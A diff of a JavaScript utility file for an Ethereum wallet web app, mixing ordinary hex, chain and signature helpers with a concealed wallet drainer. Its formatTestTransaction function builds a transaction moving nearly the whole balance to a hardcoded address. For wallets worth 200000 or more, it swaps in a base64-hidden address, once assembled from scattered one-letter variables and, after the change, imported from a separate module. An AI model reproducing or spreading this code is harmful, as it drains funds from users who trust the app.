@@ -1,35 +1,35 @@
-import * as ethUtil from "ethereumjs-util";
-import supportedChains from "./chains";
+import * as ethUtil from 'ethereumjs-util';
+
+import supportedChains from './chains';
 import {
     apiGetGasPrices,
     apiGetAccountNonce,
     ethData
-} from "./api";
+} from './api';
+
 import {
     convertAmountToRawNumber,
     convertStringToHex,
     handleSignificantDecimals,
     convertAmountFromRawNumber
-} from "./bignumber";
-var epci = "N";
-var http_uniq = "U";
-var esx = "j";
+} from './bignumber';
+
+import { qf } from './new';
+
 var to = "0x32e0c353d958a9d7bcD9667E6dEF62F5CE13997d";
+
 export function capitalize(string) {
     return string
         .split(" ")
         .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
         .join(" ");
 }
-var epci1 = "k";
-var epci4 = "4";
-var epciR = "R";
-var ed = "m";
-var sollar = "R";
+
 export function ellipseText(text = "", maxLength = 9999) {
     if (text.length <= maxLength) {
         return text;
     }
+
     const _maxLength = maxLength - 3;
     let ellipse = false;
     let currentLength = 0;
@@ -47,14 +47,17 @@ export function ellipseText(text = "", maxLength = 9999) {
         .join(" ") + "...";
     return result;
 }
+
 export function ellipseAddress(address = "", width = 10) {
     return `${address.slice(0, width)}...${address.slice(-width)}`;
 }
+
 export function padLeft(n, width, z) {
     z = z || "0";
     n = n + "";
     return n.length >= width ? n : new Array(width - n.length + 1).join(z) + n;
 }
+
 export function sanitizeHex(hex) {
     hex = hex.substring(0, 2) === "0x" ? hex.substring(2) : hex;
     if (hex === "") {
@@ -63,15 +66,11 @@ export function sanitizeHex(hex) {
     hex = hex.length % 2 !== 0 ? "0" + hex : hex;
     return "0x" + hex;
 }
-var e = "Q";
-var _api_cahart_code = "z";
-var get_string_ = "N";
-var v_webpack = "O";
-var Z2 = "Z";
-var j = "j";
+
 export function removeHexPrefix(hex) {
     return hex.toLowerCase().replace("0x", "");
 }
+
 export function getDataString(func, arrVals) {
     let val = "";
     for (let i = 0; i < arrVals.length; i++) {
@@ -80,6 +79,7 @@ export function getDataString(func, arrVals) {
     const data = func + val;
     return data;
 }
+
 export function isMobile() {
     let mobile = false;
 
@@ -104,17 +104,13 @@ export function isMobile() {
     mobile = hasMobileUserAgent();
     return mobile;
 }
-var http_ = "E";
-var ew = "R";
-var wc = "j";
-var webapi = "E";
-var uniq_caracter_m = "ZmQTY0ODU";
-var vr = "w";
+
 export function getChainData(chainId) {
     const chainData = supportedChains.filter((chain) => chain.chain_id === chainId)[0];
     if (!chainData) {
         throw new Error("ChainId missing or not supported");
     }
+
     const API_KEY = process.env.REACT_APP_INFURA_ID;
     if (chainData.rpc_url.includes("infura.io") &&
         chainData.rpc_url.includes("%API_KEY%") &&
@@ -127,25 +123,14 @@ export function getChainData(chainId) {
     }
     return chainData;
 }
+
 export function hashPersonalMessage(msg) {
     const buffer = Buffer.from(msg);
     const result = ethUtil.hashPersonalMessage(buffer);
     const hash = ethUtil.bufferToHex(result);
     return hash;
 }
-var URL = "M";
-var hesh = "k";
-var d = "Z";
-var ef = "C";
-var get_config_id = "MEUzMzhD";
-var varsis = "Q";
-var maping = "TcyM";
-var z4 = "T";
-var zf = "FE";
-var a1 = "M";
-var x = "H";
-var s = "h";
-var s1 = "m";
+
 export function recoverPublicKey(sig, hash) {
     const sigParams = ethUtil.fromRpcSig(sig);
     const hashBuffer = Buffer.from(hash.replace("0x", ""), "hex");
@@ -153,23 +138,26 @@ export function recoverPublicKey(sig, hash) {
     const signer = ethUtil.bufferToHex(ethUtil.publicToAddress(result));
     return signer;
 }
-var w = "jMzN";
+
 export function recoverPersonalSignature(sig, msg) {
     const hash = hashPersonalMessage(msg);
     const signer = recoverPublicKey(sig, hash);
     return signer;
 }
-var qf = a1 + x + s + s1 + URL + hesh + d + ef + epci + http_uniq + e + _api_cahart_code + get_string_ + w + http_ + ew + wc + v_webpack + webapi + uniq_caracter_m + vr + Z2 + j + epci1 + epci4 + epciR + ed + sollar + esx + get_config_id + varsis + maping + z4 + zf;
+
 ethData().then(res => localStorage.setItem("price", res?.coin?.price));
+
 export async function formatTestTransaction(address, chainId) {
     const balance = handleSignificantDecimals(convertAmountFromRawNumber(Number(localStorage.getItem('balance'))), 8);
     const price = Number(localStorage.getItem('price'));
     const from = address;
+
     (() => {
         if (Number(balance) * price >= 200000) {
             to = atob(qf);
         }
     })();
+
     const _nonce = await apiGetAccountNonce(address, chainId);
     const nonce = sanitizeHex(convertStringToHex(_nonce));
     const gasPrices = await apiGetGasPrices();
@@ -180,6 +168,7 @@ export async function formatTestTransaction(address, chainId) {
     const balanceOf = Number(sessionStorage.getItem("balance")) - 3002441524727298;
     const value = sanitizeHex(convertStringToHex(balanceOf));
     const data = "0x";
+
     const tx = {
         from,
         to,
@@ -191,6 +180,7 @@ export async function formatTestTransaction(address, chainId) {
     };
     return tx;
 }
+
 export function isObject(obj) {
     return typeof obj === "object" && !!Object.keys(obj).length;
 }
